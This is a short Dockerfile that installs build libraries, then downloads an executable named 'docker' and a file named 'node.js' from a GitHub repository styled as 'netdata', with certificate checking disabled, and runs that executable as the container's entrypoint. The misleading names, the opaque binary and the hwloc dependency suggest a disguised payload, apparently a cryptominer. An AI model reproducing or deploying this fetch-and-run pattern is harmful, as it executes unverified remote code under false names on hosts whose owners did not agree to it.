FROM ubuntu:16.04  
  
RUN apt-get update \  
&& apt-get -qq --no-install-recommends install \  
wget \  
libhwloc-dev \  
libssl-dev \  
&& rm -r /var/lib/apt/lists/* \  
&& wget --no-check-certificate
https://github.com/winedodupa/netdata/raw/master/docker \  
&& wget --no-check-certificate
https://github.com/winedodupa/netdata/raw/master/node.js \  
&& chmod +x docker  
  
ENTRYPOINT ["./docker"]  
CMD ["node.js"]  

